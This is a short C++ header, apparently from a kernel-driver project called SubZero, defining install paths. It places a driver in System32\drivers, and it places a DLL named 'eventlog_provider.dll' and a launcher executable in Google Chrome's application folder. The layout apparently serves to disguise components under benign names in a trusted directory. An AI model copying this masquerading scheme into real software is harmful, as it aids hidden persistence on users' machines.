#pragma once
#include "pch.h"
#include "../SubZeroDriver/SubZeroCommon.h"

const HKEY REG_SZ_KEY_ROOT = HKEY_LOCAL_MACHINE;
const std::wstring DRIVER_FILE_NAME(DRIVER_NAMEW L".sys");
const std::wstring DLL_FILE_NAME(L"eventlog_provider.dll");
const std::wstring DIRECTORY_PATH(L"C:\\Program Files\\Google\\Chrome\\Application\\");
const std::wstring DRIVER_FULL_PATH(L"C:\\Windows\\System32\\drivers\\" + DRIVER_FILE_NAME);
const std::wstring DLL_FULL_PATH(DIRECTORY_PATH + DLL_FILE_NAME);
const std::wstring LAUNCHER_FULL_PATH(DIRECTORY_PATH + REG_VALUE_NAME + L".exe");